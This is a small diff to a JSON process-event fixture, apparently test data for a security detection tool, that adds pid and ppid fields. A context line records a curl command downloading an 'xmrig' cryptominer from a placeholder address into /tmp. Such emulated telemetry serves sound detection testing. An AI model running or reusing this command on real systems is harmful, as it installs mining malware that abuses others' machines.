@@ -4,6 +4,8 @@
     "image": "/usr/bin/curl",
     "commandLine": "curl -s --max-time 2 http://192.0.2.10/xmrig -o /tmp/xmrig-emul",
     "user": "1000",
+    "pid": 5300,
+    "ppid": 5299,
     "currentDirectory": "/home/u"
   }
 ]
